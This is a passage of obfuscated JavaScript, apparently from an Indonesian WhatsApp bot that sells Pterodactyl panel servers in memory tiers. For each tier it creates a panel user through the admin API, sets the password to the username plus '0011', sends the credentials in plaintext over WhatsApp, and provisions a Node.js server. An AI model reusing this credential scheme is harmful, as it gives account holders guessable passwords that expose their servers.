          ctf = "Hai @" + _0x3116b9.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x375c32.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x49adc9 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x3116b9, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x222736 = await _0x1fae29.json();
          let _0x1910bd = _0x222736.attributes.startup;
          let _0x41979b = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x4a27c8,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x375c32.id,
              'egg': parseInt(_0x2ee2ce),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x1910bd,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "6144",
                'swap': 0x0,
                'disk': "6144",
                'io': 0x1f4,
                'cpu': "150"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x280210)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x39d01b = await _0x41979b.json();
          if (_0x39d01b.errors) {
            return _0x427bb7(JSON.stringify(_0x39d01b.errors[0x0], null, 0x2));
          }
        }
        break;
      case "7gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x4da8c7 = _0x4ec028.split(',');
          if (_0x4da8c7.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x52db0d = _0x4da8c7[0x0];
          let _0x480a50 = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x4da8c7[0x1] ? _0x4da8c7[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x883f2 = _0x52db0d + "7GB";
          let _0xd35b76 = global.eggsnya;
          let _0x506fe4 = global.location;
          let _0x46a781 = _0x52db0d + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpgg";
          if (!_0x480a50) {
            return;
          }
          let _0x56d149 = _0x52db0d + "0011";
          let _0x7cc367 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x46a781,
              'username': _0x52db0d,
              'first_name': _0x52db0d,
              'last_name': _0x52db0d,
              'language': 'en',
              'password': _0x56d149
            })
          });
          let _0x37ea9c = await _0x7cc367.json();
          if (_0x37ea9c.errors) {
            return _0x427bb7(JSON.stringify(_0x37ea9c.errors[0x0], null, 0x2));
          }
          let _0x347f33 = _0x37ea9c.attributes;
          let _0x265552 = await fetch(domain + "/api/application/nests/5/eggs/" + _0xd35b76, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x347f33.id);
          ctf = "Hai @" + _0x480a50.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x347f33.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x56d149 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x480a50, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x4920e8 = await _0x265552.json();
          let _0x1ee2a7 = _0x4920e8.attributes.startup;
          let _0x5af04c = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x883f2,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x347f33.id,
              'egg': parseInt(_0xd35b76),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x1ee2a7,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "7168",
                'swap': 0x0,
                'disk': "7168",
                'io': 0x1f4,
                'cpu': "170"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x506fe4)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x35e78c = await _0x5af04c.json();
          if (_0x35e78c.errors) {
            return _0x427bb7(JSON.stringify(_0x35e78c.errors[0x0], null, 0x2));
          }
        }
        break;
      case "8gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x9f483a = _0x4ec028.split(',');
          if (_0x9f483a.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x5d45b5 = _0x9f483a[0x0];
          let _0x5a854a = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x9f483a[0x1] ? _0x9f483a[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x58bb77 = _0x5d45b5 + "8GB";
          let _0x8d18d2 = global.eggsnya;
          let _0x54052c = global.location;
          let _0x4966a8 = _0x5d45b5 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x5a854a) {
            return;
          }
          let _0x5b8b26 = _0x5d45b5 + "0011";
          let _0x55e011 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x4966a8,
              'username': _0x5d45b5,
              'first_name': _0x5d45b5,
              'last_name': _0x5d45b5,
              'language': 'en',
              'password': _0x5b8b26
            })
          });
          let _0xc055de = await _0x55e011.json();
          if (_0xc055de.errors) {
            return _0x427bb7(JSON.stringify(_0xc055de.errors[0x0], null, 0x2));
          }
          let _0x2656b6 = _0xc055de.attributes;
          let _0x252d3d = await fetch(domain + "/api/application/nests/5/eggs/" + _0x8d18d2, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x2656b6.id);
          ctf = "Hai @" + _0x5a854a.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x2656b6.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x5b8b26 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x5a854a, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x55567f = await _0x252d3d.json();
          let _0xd4427c = _0x55567f.attributes.startup;
          let _0x31c05e = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x58bb77,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x2656b6.id,
              'egg': parseInt(_0x8d18d2),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0xd4427c,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "8192",
                'swap': 0x0,
                'disk': "8192",
                'io': 0x1f4,
                'cpu': "200"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x54052c)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x504647 = await _0x31c05e.json();
          if (_0x504647.errors) {
            return _0x427bb7(JSON.stringify(_0x504647.errors[0x0], null, 0x2));
          }
        }
        break;
      case "9gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x3c48d3 = _0x4ec028.split(',');
          if (_0x3c48d3.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x3bea3d = _0x3c48d3[0x0];
          let _0x5c8a87 = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x3c48d3[0x1] ? _0x3c48d3[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x4ef460 = _0x3bea3d + "9GB";
          let _0x4bab9e = global.eggsnya;
          let _0x658e6e = global.location;
          let _0x694a08 = _0x3bea3d + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x5c8a87) {
            return;
          }
          let _0x2d0392 = _0x3bea3d + "0011";
          let _0x264605 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x694a08,
              'username': _0x3bea3d,
              'first_name': _0x3bea3d,
              'last_name': _0x3bea3d,
              'language': 'en',
              'password': _0x2d0392
            })
          });
          let _0x23c879 = await _0x264605.json();
          if (_0x23c879.errors) {
            return _0x427bb7(JSON.stringify(_0x23c879.errors[0x0], null, 0x2));
          }
          let _0x520af5 = _0x23c879.attributes;
          let _0x2ecbba = await fetch(domain + "/api/application/nests/5/eggs/" + _0x4bab9e, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x520af5.id);
          ctf = "Hai @" + _0x5c8a87.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x520af5.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x2d0392 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x5c8a87, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x518617 = await _0x2ecbba.json();
          let _0x34fd90 = _0x518617.attributes.startup;
          let _0x35ea0f = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x4ef460,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x520af5.id,
              'egg': parseInt(_0x4bab9e),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x34fd90,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "9216",
                'swap': 0x0,
                'disk': "9216",
                'io': 0x1f4,
                'cpu': "220"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x658e6e)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x220d48 = await _0x35ea0f.json();
          if (_0x220d48.errors) {
            return _0x427bb7(JSON.stringify(_0x220d48.errors[0x0], null, 0x2));
          }
        }
        break;
      case "10gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x1671c2 = _0x4ec028.split(',');
          if (_0x1671c2.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x30f08f = _0x1671c2[0x0];
          let _0x2cebd1 = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x1671c2[0x1] ? _0x1671c2[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x29bd68 = _0x30f08f + "10GB";
          let _0x34dead = global.eggsnya;
          let _0x35f8ad = global.location;
          let _0x2de4b1 = _0x30f08f + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x2cebd1) {
            return;
          }
          let _0x27b456 = _0x30f08f + "0011";
          let _0x1e5819 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x2de4b1,
              'username': _0x30f08f,
              'first_name': _0x30f08f,
              'last_name': _0x30f08f,
              'language': 'en',
              'password': _0x27b456
            })
          });
          let _0xb8714e = await _0x1e5819.json();
          if (_0xb8714e.errors) {
            return _0x427bb7(JSON.stringify(_0xb8714e.errors[0x0], null, 0x2));
          }
          let _0x12c352 = _0xb8714e.attributes;
          let _0x1acc09 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x34dead, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x12c352.id);
          ctf = "Hai @" + _0x2cebd1.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x12c352.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x27b456 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x2cebd1, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x367fcf = await _0x1acc09.json();
          let _0x4dc8d7 = _0x367fcf.attributes.startup;
          let _0x59d2f = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x29bd68,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x12c352.id,
              'egg': parseInt(_0x34dead),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x4dc8d7,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "10240",
                'swap': 0x0,
                'disk': "10240",
                'io': 0x1f4,
                'cpu': "250"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x35f8ad)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x2bad5e = await _0x59d2f.json();
          if (_0x2bad5e.errors) {
            return _0x427bb7(JSON.stringify(_0x2bad5e.errors[0x0], null, 0x2));
          }
        }
        break;
      case "21gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x4721ec = _0x4ec028.split(',');
          if (_0x4721ec.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x33cec5 = _0x4721ec[0x0];
          let _0x30aeaa = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x4721ec[0x1] ? _0x4721ec[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x2b5f7f = _0x33cec5 + "20GB";
          let _0x192a7b = global.eggsnya;
          let _0x191906 = global.location;
          let _0x3b3e8c = _0x33cec5 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x30aeaa) {
            return;
          }
          let _0x5e2d8d = _0x33cec5 + "0011";
          let _0x48adae = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x3b3e8c,
              'username': _0x33cec5,
              'first_name': _0x33cec5,
              'last_name': _0x33cec5,
              'language': 'en',
              'password': _0x5e2d8d
            })
          });
          let _0xba5df9 = await _0x48adae.json();
          if (_0xba5df9.errors) {
            return _0x427bb7(JSON.stringify(_0xba5df9.errors[0x0], null, 0x2));
          }
          let _0x21806f = _0xba5df9.attributes;
          let _0x2ceb5a = await fetch(domain + "/api/application/nests/5/eggs/" + _0x192a7b, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x21806f.id);
          ctf = "Hai @" + _0x30aeaa.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x21806f.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x5e2d8d + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x30aeaa, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x378084 = await _0x2ceb5a.json();
          let _0x11a33c = _0x378084.attributes.startup;
          let _0x34d8be = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x2b5f7f,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x21806f.id,
              'egg': parseInt(_0x192a7b),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x11a33c,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "20240",
                'swap': 0x0,
                'disk': "20240",
                'io': 0x1f4,
                'cpu': "530"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x191906)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x571800 = await _0x34d8be.json();
          if (_0x571800.errors) {
            return _0x427bb7(JSON.stringify(_0x571800.errors[0x0], null, 0x2));
          }
        }
        break;
      case "25gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x302a9f = _0x4ec028.split(',');
          if (_0x302a9f.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x562a38 = _0x302a9f[0x0];
          let _0x50fdad = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x302a9f[0x1] ? _0x302a9f[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x17c607 = _0x562a38 + "25GB";
          let _0x2f3a77 = global.eggsnya;
          let _0x4eac01 = global.location;
          let _0x4c27e5 = _0x562a38 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x50fdad) {
            return;
          }
          let _0x4e0c68 = _0x562a38 + "0011";
          let _0x12e987 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x4c27e5,
              'username': _0x562a38,
              'first_name': _0x562a38,
              'last_name': _0x562a38,
              'language': 'en',
              'password': _0x4e0c68
            })
          });
          let _0x137549 = await _0x12e987.json();
          if (_0x137549.errors) {
            return _0x427bb7(JSON.stringify(_0x137549.errors[0x0], null, 0x2));
          }
          let _0x2965b0 = _0x137549.attributes;
          let _0x1ae48a = await fetch(domain + "/api/application/nests/5/eggs/" + _0x2f3a77, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x2965b0.id);
          ctf = "Hai @" + _0x50fdad.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x2965b0.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x4e0c68 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x50fdad, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x2e7a3c = await _0x1ae48a.json();
          let _0x6e7352 = _0x2e7a3c.attributes.startup;
          let _0x1badd8 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x17c607,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x2965b0.id,
              'egg': parseInt(_0x2f3a77),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x6e7352,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
